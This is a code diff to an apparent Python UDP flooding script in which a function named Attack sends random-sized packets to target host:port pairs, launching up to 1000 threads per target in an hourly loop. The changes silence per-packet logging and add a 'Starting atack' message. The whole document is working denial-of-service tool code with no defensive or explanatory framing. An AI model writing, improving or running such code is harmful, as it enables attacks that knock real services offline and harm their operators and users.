@@ -18,7 +18,7 @@ def Attack(target, port, kbytes, timeout):
             b = Bytes*random.randint(1,22)
             sock.sendto(b,(target,port))
             sent=sent + 1
-            print("Sent %s packets to %s port %s with %s bytes" % (sent, target, port, len(b)))
+            #print("Sent %s packets to %s port %s with %s bytes" % (sent, target, port, len(b)))
         return
     except KeyboardInterrupt:
         sys.exit()
@@ -36,7 +36,9 @@ while 1 == 1:
             count_threads = int(1000//count_targets)
             for r in rrow:
                 trgt = r.split(":")
+                print ("Starting atack to %s with %s threads on %s port" % (trgt[0], count_threads, trgt[1]))
                 for i in range(count_threads):
                     print ("Starting %s thread", i)
+                    
                     threading.Thread(target=Attack, args=(trgt[0], int(trgt[1]), 1024, timeout,)).start()
     time.sleep(3600)
